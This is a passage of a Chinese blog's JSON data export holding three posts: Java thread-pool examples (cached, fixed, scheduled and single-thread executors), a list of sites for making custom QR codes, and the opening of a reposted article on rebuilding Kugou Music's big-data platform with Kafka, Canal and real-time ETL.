class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService cachedThreadPool = Executors.newCachedThreadPool();</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    try { </span><br><span class=\"line\">        Thread.sleep(index * 1000);</span><br><span class=\"line\">    } catch (InterruptedException e) {</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    }</span><br><span class=\"line\">    cachedThreadPool.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            System.out.println(index);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x7EBF;&#x7A0B;&#x6C60;&#x4E3A;&#x65E0;&#x9650;&#x5927;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x7B2C;&#x4E8C;&#x4E2A;&#x4EFB;&#x52A1;&#x65F6;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#xFF0C;&#x4F1A;&#x590D;&#x7528;&#x6267;&#x884C;&#x7B2C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x4E0D;&#x7528;&#x6BCF;&#x6B21;&#x65B0;&#x5EFA;&#x7EBF;&#x7A0B;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x9700;&#x8981;&#x6267;&#x884C;&#x5F88;&#x591A;&#x77ED;&#x671F;&#x5F02;&#x6B65;&#x4EFB;&#x52A1;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;&#x7A0B;&#x5E8F;&#x6027;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A;&#x957F;&#x65F6;&#x95F4;&#x4FDD;&#x6301;&#x7A7A;&#x95F2;&#x7684;&#x8FD9;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#x4E0D;&#x4F1A;&#x5360;&#x7528;&#x4EFB;&#x4F55;&#x8D44;&#x6E90;&#xFF0C;&#x8C03;&#x7528;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5BF9;&#x8C61;&#x5C06;&#x91CD;&#x7528;&#x4EE5;&#x524D;&#x6784;&#x9020;&#x7684;&#x7EBF;&#x7A0B;&#xFF08;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x72B6;&#x6001;&#xFF09;&#xFF0C;&#x82E5;&#x7EBF;&#x7A0B;&#x6CA1;&#x6709;&#x53EF;&#x7528;&#x7684;&#xFF0C;&#x5219;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7EBF;&#x7A0B;&#x6DFB;&#x52A0;&#x5230;&#x6C60;&#x4E2D;&#xFF0C;&#x7F13;&#x5B58;&#x7EBF;&#x7A0B;&#x6C60;&#x5C06;&#x7EC8;&#x6B62;&#x5E76;&#x4ECE;&#x6C60;&#x4E2D;&#x79FB;&#x9664;60&#x79D2;&#x672A;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x7EBF;&#x7A0B;&#x3002;</p>\n<h4 id=\"2&#x3001;newFixedThreadPool\"><a href=\"#2&#x3001;newFixedThreadPool\" class=\"headerlink\" title=\"2&#x3001;newFixedThreadPool\"></a>2&#x3001;newFixedThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x53EF;&#x63A7;&#x5236;&#x7EBF;&#x7A0B;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x6570;&#xFF0C;&#x8D85;&#x51FA;&#x7684;&#x7EBF;&#x7A0B;&#x4F1A;&#x5728;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    fixedThreadPool.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                System.out.println(index);</span><br><span class=\"line\">                Thread.sleep(2000);</span><br><span class=\"line\">            } catch (InterruptedException e) {</span><br><span class=\"line\">                // TODO Auto-generated catch block</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x56E0;&#x4E3A;&#x7EBF;&#x7A0B;&#x6C60;&#x5927;&#x5C0F;&#x4E3A;3&#xFF0C;&#x6BCF;&#x4E2A;&#x4EFB;&#x52A1;&#x8F93;&#x51FA;index&#x540E;sleep 2&#x79D2;&#xFF0C;<strong>&#x6240;&#x4EE5;&#x6BCF;&#x4E24;&#x79D2;&#x6253;&#x5370;3&#x4E2A;&#x6570;&#x5B57;</strong>&#x3002;<br>&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x5927;&#x5C0F;&#x6700;&#x597D;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002;&#x5982;Runtime.getRuntime().availableProcessors()&#x3002;&#x53EF;&#x53C2;&#x8003;PreloadDataCache&#x3002;</p>\n<h4 id=\"3&#x3001;newScheduledThreadPool\"><a href=\"#3&#x3001;newScheduledThreadPool\" class=\"headerlink\" title=\"3&#x3001;newScheduledThreadPool\"></a>3&#x3001;newScheduledThreadPool</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B9A;&#x957F;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x652F;&#x6301;&#x5B9A;&#x65F6;&#x53CA;&#x5468;&#x671F;&#x6027;&#x4EFB;&#x52A1;&#x6267;&#x884C;&#x3002;<br>&#x5EF6;&#x8FDF;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);</span><br><span class=\"line\">scheduledThreadPool.schedule(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        System.out.println(&quot;delay 3 seconds&quot;);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}, 3, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure>\n<p><strong>&#x8868;&#x793A;&#x5EF6;&#x8FDF;3&#x79D2;&#x6267;&#x884C;&#x3002;</strong></p>\n<p>&#x5B9A;&#x671F;&#x6267;&#x884C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scheduledThreadPool.scheduleAtFixedRate(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void run() {</span><br><span class=\"line\">        System.out.println(&quot;delay 1 seconds, and excute every 3 seconds&quot;);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}, 1, 3, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x8868;&#x793A;&#x5EF6;&#x8FDF;1&#x79D2;&#x540E;&#x6BCF;3&#x79D2;&#x6267;&#x884C;&#x4E00;&#x6B21;</strong>&#x3002;<br>ScheduledExecutorService&#x6BD4;Timer&#x66F4;&#x5B89;&#x5168;&#xFF0C;&#x529F;&#x80FD;&#x66F4;&#x5F3A;&#x5927;&#x3002;<br>&#x53C2;&#x6570;5&#x6307;&#x7684;&#x662F;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x9700;&#x8981;&#x4FDD;&#x6301;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#xFF0C;&#x5373;&#x4FBF;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;&#x90FD;&#x662F;&#x7A7A;&#x95F2;&#x7684;</p>\n<h4 id=\"4&#x3001;newSingleThreadExecutor\"><a href=\"#4&#x3001;newSingleThreadExecutor\" class=\"headerlink\" title=\"4&#x3001;newSingleThreadExecutor\"></a>4&#x3001;newSingleThreadExecutor</h4><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5355;&#x7EBF;&#x7A0B;&#x5316;&#x7684;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x5B83;&#x53EA;&#x4F1A;&#x7528;&#x552F;&#x4E00;&#x7684;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x52A1;&#xFF0C;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x4EFB;&#x52A1;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x987A;&#x5E8F;(FIFO, LIFO, &#x4F18;&#x5148;&#x7EA7;)&#x6267;&#x884C;&#x3002;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();</span><br><span class=\"line\">for (int i = 0; i &lt; 10; i++) {</span><br><span class=\"line\">    final int index = i;</span><br><span class=\"line\">    singleThreadExecutor.execute(new Runnable() {</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void run() {</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                System.out.println(index);</span><br><span class=\"line\">                Thread.sleep(2000);</span><br><span class=\"line\">            } catch (InterruptedException e) {</span><br><span class=\"line\">                // TODO Auto-generated catch block</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x7ED3;&#x679C;&#x4F9D;&#x6B21;&#x8F93;&#x51FA;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x5404;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;<br>&#x73B0;&#x884C;&#x5927;&#x591A;&#x6570;GUI&#x7A0B;&#x5E8F;&#x90FD;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#x3002;Android&#x4E2D;&#x5355;&#x7EBF;&#x7A0B;&#x53EF;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#xFF0C;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5B89;&#x88C5;&#xFF0C;&#x5E94;&#x7528;&#x6279;&#x91CF;&#x5220;&#x9664;&#x7B49;&#x4E0D;&#x9002;&#x5408;&#x5E76;&#x53D1;&#x4F46;&#x53EF;&#x80FD;IO&#x963B;&#x585E;&#x6027;&#x53CA;&#x5F71;&#x54CD;UI&#x7EBF;&#x7A0B;&#x54CD;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>"},{"title":"自定义二维码","date":"2016-05-14T13:18:00.000Z","toc":false,"_content":"\n**二维码不一定是单调的黑白格子，也可以很丰富。**\n\n最近用到的二维码在线生成网站：\n\n- 二维工坊：[http://visual.2weima.com/](http://visual.2weima.com/)\n- 云来图形二维码：[http://qrcode.yunlai.cn/](http://qrcode.yunlai.cn/)\n\n我给\"星空博客\"网站生成的二维码：\n\n![二维码——wangxin123.com](http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/1.gif)\n\n<!-- more -->\n\n生成的动图二维码如果较大，需要进行相关压缩，不然页面加载比较慢\n**压缩工具**：[http://www.jb51.net/softs/107350.html](http://www.jb51.net/softs/107350.html)\n\n关于二维码更多详情，可以去知乎上查找，输入\"二维码\"即可\n\n![知乎](http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/2.png)\n\n图文并茂，介绍的非常详细，比如下面这篇文章\n**二维码怎么才会让人有扫的冲动**：[https://www.zhihu.com/question/21546400](https://www.zhihu.com/question/21546400)\n<br/>","source":"_posts/自定义二维码.md","raw":"---\ntitle: 自定义二维码\ncategories:\n  - 其他技术\ndate: 2016-5-14 21:18:00\ntoc: false\n---\n\n**二维码不一定是单调的黑白格子，也可以很丰富。**\n\n最近用到的二维码在线生成网站：\n\n- 二维工坊：[http://visual.2weima.com/](http://visual.2weima.com/)\n- 云来图形二维码：[http://qrcode.yunlai.cn/](http://qrcode.yunlai.cn/)\n\n我给\"星空博客\"网站生成的二维码：\n\n![二维码——wangxin123.com](http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/1.gif)\n\n<!-- more -->\n\n生成的动图二维码如果较大，需要进行相关压缩，不然页面加载比较慢\n**压缩工具**：[http://www.jb51.net/softs/107350.html](http://www.jb51.net/softs/107350.html)\n\n关于二维码更多详情，可以去知乎上查找，输入\"二维码\"即可\n\n![知乎](http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/2.png)\n\n图文并茂，介绍的非常详细，比如下面这篇文章\n**二维码怎么才会让人有扫的冲动**：[https://www.zhihu.com/question/21546400](https://www.zhihu.com/question/21546400)\n<br/>","slug":"自定义二维码","published":1,"updated":"2016-11-17T11:59:42.682Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulev0055gwtml6t57wva","content":"<p><strong>&#x4E8C;&#x7EF4;&#x7801;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5355;&#x8C03;&#x7684;&#x9ED1;&#x767D;&#x683C;&#x5B50;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5F88;&#x4E30;&#x5BCC;&#x3002;</strong></p>\n<p>&#x6700;&#x8FD1;&#x7528;&#x5230;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x7F51;&#x7AD9;&#xFF1A;</p>\n<ul>\n<li>&#x4E8C;&#x7EF4;&#x5DE5;&#x574A;&#xFF1A;<a href=\"http://visual.2weima.com/\" target=\"_blank\" rel=\"external\">http://visual.2weima.com/</a></li>\n<li>&#x4E91;&#x6765;&#x56FE;&#x5F62;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;<a href=\"http://qrcode.yunlai.cn/\" target=\"_blank\" rel=\"external\">http://qrcode.yunlai.cn/</a></li>\n</ul>\n<p>&#x6211;&#x7ED9;&#x201D;&#x661F;&#x7A7A;&#x535A;&#x5BA2;&#x201D;&#x7F51;&#x7AD9;&#x751F;&#x6210;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/1.gif\" alt=\"&#x4E8C;&#x7EF4;&#x7801;&#x2014;&#x2014;wangxin123.com\"></p>\n<a id=\"more\"></a>\n<p>&#x751F;&#x6210;&#x7684;&#x52A8;&#x56FE;&#x4E8C;&#x7EF4;&#x7801;&#x5982;&#x679C;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x538B;&#x7F29;&#xFF0C;&#x4E0D;&#x7136;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x6BD4;&#x8F83;&#x6162;<br><strong>&#x538B;&#x7F29;&#x5DE5;&#x5177;</strong>&#xFF1A;<a href=\"http://www.jb51.net/softs/107350.html\" target=\"_blank\" rel=\"external\">http://www.jb51.net/softs/107350.html</a></p>\n<p>&#x5173;&#x4E8E;&#x4E8C;&#x7EF4;&#x7801;&#x66F4;&#x591A;&#x8BE6;&#x60C5;&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;&#x77E5;&#x4E4E;&#x4E0A;&#x67E5;&#x627E;&#xFF0C;&#x8F93;&#x5165;&#x201D;&#x4E8C;&#x7EF4;&#x7801;&#x201D;&#x5373;&#x53EF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/2.png\" alt=\"&#x77E5;&#x4E4E;\"></p>\n<p>&#x56FE;&#x6587;&#x5E76;&#x8302;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF0C;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;<br><strong>&#x4E8C;&#x7EF4;&#x7801;&#x600E;&#x4E48;&#x624D;&#x4F1A;&#x8BA9;&#x4EBA;&#x6709;&#x626B;&#x7684;&#x51B2;&#x52A8;</strong>&#xFF1A;<a href=\"https://www.zhihu.com/question/21546400\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/21546400</a><br><br></p>\n","excerpt":"<p><strong>&#x4E8C;&#x7EF4;&#x7801;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5355;&#x8C03;&#x7684;&#x9ED1;&#x767D;&#x683C;&#x5B50;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5F88;&#x4E30;&#x5BCC;&#x3002;</strong></p>\n<p>&#x6700;&#x8FD1;&#x7528;&#x5230;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x7F51;&#x7AD9;&#xFF1A;</p>\n<ul>\n<li>&#x4E8C;&#x7EF4;&#x5DE5;&#x574A;&#xFF1A;<a href=\"http://visual.2weima.com/\">http://visual.2weima.com/</a></li>\n<li>&#x4E91;&#x6765;&#x56FE;&#x5F62;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;<a href=\"http://qrcode.yunlai.cn/\">http://qrcode.yunlai.cn/</a></li>\n</ul>\n<p>&#x6211;&#x7ED9;&#x201D;&#x661F;&#x7A7A;&#x535A;&#x5BA2;&#x201D;&#x7F51;&#x7AD9;&#x751F;&#x6210;&#x7684;&#x4E8C;&#x7EF4;&#x7801;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/1.gif\" alt=\"&#x4E8C;&#x7EF4;&#x7801;&#x2014;&#x2014;wangxin123.com\"></p>","more":"<p>&#x751F;&#x6210;&#x7684;&#x52A8;&#x56FE;&#x4E8C;&#x7EF4;&#x7801;&#x5982;&#x679C;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x538B;&#x7F29;&#xFF0C;&#x4E0D;&#x7136;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x6BD4;&#x8F83;&#x6162;<br><strong>&#x538B;&#x7F29;&#x5DE5;&#x5177;</strong>&#xFF1A;<a href=\"http://www.jb51.net/softs/107350.html\">http://www.jb51.net/softs/107350.html</a></p>\n<p>&#x5173;&#x4E8E;&#x4E8C;&#x7EF4;&#x7801;&#x66F4;&#x591A;&#x8BE6;&#x60C5;&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;&#x77E5;&#x4E4E;&#x4E0A;&#x67E5;&#x627E;&#xFF0C;&#x8F93;&#x5165;&#x201D;&#x4E8C;&#x7EF4;&#x7801;&#x201D;&#x5373;&#x53EF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/2.png\" alt=\"&#x77E5;&#x4E4E;\"></p>\n<p>&#x56FE;&#x6587;&#x5E76;&#x8302;&#xFF0C;&#x4ECB;&#x7ECD;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF0C;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;<br><strong>&#x4E8C;&#x7EF4;&#x7801;&#x600E;&#x4E48;&#x624D;&#x4F1A;&#x8BA9;&#x4EBA;&#x6709;&#x626B;&#x7684;&#x51B2;&#x52A8;</strong>&#xFF1A;<a href=\"https://www.zhihu.com/question/21546400\">https://www.zhihu.com/question/21546400</a><br><br></p>"},{"title":"酷狗音乐的大数据平台重构","date":"2016-06-29T13:18:00.000Z","toc":false,"_content":"\n> 本文是酷狗音乐的架构师王劲对酷狗大数据架构重构的总结。酷狗音乐的大数据架构本身很经典，而这篇讲解了对原来的架构上进行重构的工作内容，总共分为**重构的原因、新一代的大数据技术架构、踩过的坑、后续持续改进**四个部分来给大家谈酷狗音乐大数据平台重构的过程。\n\n眨眼就是新的一年了，时间过的真快，趁这段时间一直在写总结的机会，也总结下上一年的工作经验，避免重复踩坑。酷狗音乐大数据平台重构整整经历了一年时间，大头的行为流水数据迁移到新平台稳定运行，在这过程中填过坑，挖过坑，为后续业务的实时计算需求打下了很好的基础。在此感谢酷狗团队成员的不懈努力，大部分从开始只知道大数据这个概念，到现在成为团队的技术支柱，感到很欣慰。\n\n从重构原因，技术架构，踩过的坑，后续持续改进四个方面来描述酷狗音乐大数据平台重构的过程，在此抛砖引玉，这次的内容与6月份在高可用架构群分享的大数据技术实践的有点不同，技术架构做了些调整。\n\n其实大数据平台是一个庞大的系统工程，整个建设周期很长，涉及的生态链很长(包括：数据采集、接入，清洗、存储计算、数据挖掘，可视化等环节，每个环节都当做一个复杂的系统来建设)，风险也很大。\n<!-- more -->\n## 一、重构原因\n\n在讲重构原因前，先介绍下原有的大数据平台架构，如下图：\n![大数据平台架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/1.jpg)\n\n从上图可知，主要基于Hadoop1.x+hive做离线计算(T+1)，基于大数据平台的数据采集、数据接入、数据清洗、作业调度、平台监控几个环节存在的一些问题来列举下。\n\n### 数据采集：\n\n1、数据收集接口众多，且数据格式混乱，基本每个业务都有自己的上报接口\n2、存在较大的重复开发成本\n3、不能汇总上报，消耗客户端资源，以及网络流量\n4、每个接口收集数据项和格式不统一，加大后期数据统计分析难度\n5、各个接口实现质量并不高，存在被刷，泄密等风险\n\n### 数据接入:\n\n1、通过rsync同步文件，很难满足实时流计算的需求\n2、接入数据出现异常后，很难排查及定位问题，需要很高的人力成本排查\n3、业务系统数据通过Kettle每天全量同步到数据中心，同步时间长，导致依赖的作业经常会有延时现象\n\n### 数据清洗：\n\n1、ETL集中在作业计算前进行处理\n2、存在重复清洗\n\n### 作业调度：\n\n1、大部分作业通过crontab调度，作业多了后不利于管理\n2、经常出现作业调度冲突\n\n### 平台监控：\n\n1、只有硬件与操作系统级监控\n2、数据平台方面的监控等于空白\n\n基于以上问题，结合在大数据中，数据的时效性越高，数据越有价值(如：实时个性化推荐系统，RTB系统，实时预警系统等)的理念，因此，开始大重构数据平台架构。\n\n## 二、新一代大数据技术架构\n\n在讲新一代大数据技术架构前，先讲下大数据特征与大数据技术要解决的问题。\n\n**1.大数据特征**：“大量化(Volume)、多样化(Variety)、快速化(Velocity)、价值密度低(Value)”就是“大数据”显著的4V特征，或者说，只有具备这些特点的数据，才是大数据。\n\n![大数据特征](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/2.jpg)\n\n**2.大数据技术要解决的问题**：大数据技术被设计用于在成本可承受的条件下，通过非常快速(velocity)地采集、发现和分析，从大量(volumes)、多类别(variety)的数据中提取价值(value)，将是IT领域新一代的技术与架构。\n![需要解决的问题](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/3.jpg)\n\n介绍了大数据的特性及大数据技术要解决的问题，我们先看看新一代大数据技术架构的数据流架构图：\n\n![数据流架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/4.jpg)\n\n从这张图中，可以了解到大数据处理过程可以分为数据源、数据接入、数据清洗、数据缓存、存储计算、数据服务、数据消费等环节，每个环节都有具有高可用性、可扩展性等特性，都为下一个节点更好的服务打下基础。整个数据流过程都被数据质量监控系统监控，数据异常自动预警、告警。\n新一代大数据整体技术架构如图：\n\n![大数据技术架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/5.jpg)\n\n将大数据计算分为实时计算与离线计算，在整个集群中，奔着能实时计算的，一定走实时计算流处理，通过实时计算流来提高数据的时效性及数据价值，同时减轻集群的资源使用率集中现象。\n\n### 整体架构从下往上解释下每层的作用：\n\n#### 数据实时采集：\n\n主要用于数据源采集服务，从数据流架构图中，可以知道，数据源分为前端日志，服务端日志，业务系统数据。下面讲解数据是怎么采集接入的。\n\n**a.前端日志采集接入**：\n\n前端日志采集要求实时，可靠性，高可用性等特性。技术选型时，对开源的数据采集工具flume,scribe,chukwa测试对比，发现基本满足不了我们的业务场景需求。所以，选择基于kafka开发一套数据采集网关，来完成数据采集需求。数据采集网关的开发过程中走了一些弯路，最后采用nginx+lua开发，基于lua实现了kafka生产者协议。有兴趣同学可以去Github上看看，另一同事实现的，现在在github上比较活跃，被一些互联网公司应用于线上环境了。\n\n**b.后端日志采集接入**：\n\nFileCollect,考虑到很多线上环境的环境变量不能改动，为减少侵入式，目前是采用Go语言实现文件采集，年后也准备重构这块。\n\n前端，服务端的数据采集整体架构如下图：\n\n![数据采集架构](http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/6.jpg)\n\n**c.业务数据接入**\n\n利用Canal通过MySQL的binlog机制实时同步业务增量数据。\n\n数据统一接入：为了后面数据流环节的处理规范，所有的数据接入数据中心，必须通过数据采集网关转换统一上报给Kafka集群，避免后端多种接入方式的处理问题。\n\n数据实时清洗(ETL)：为了减轻存储计算集群的资源压力及数据可重用性角度考虑，把数据解压、解密、转义，部分简单的补全，异常数据处理等工作前移到数据流中处理，为后面环节的数据重用打下扎实的基础(实时计算与离线计算)。\n\n数据缓存重用：为了避免大量数据流(400+亿条/天)写入HDFS，导致HDFS客户端不稳定现象及数据实时性考虑，把经过数据实时清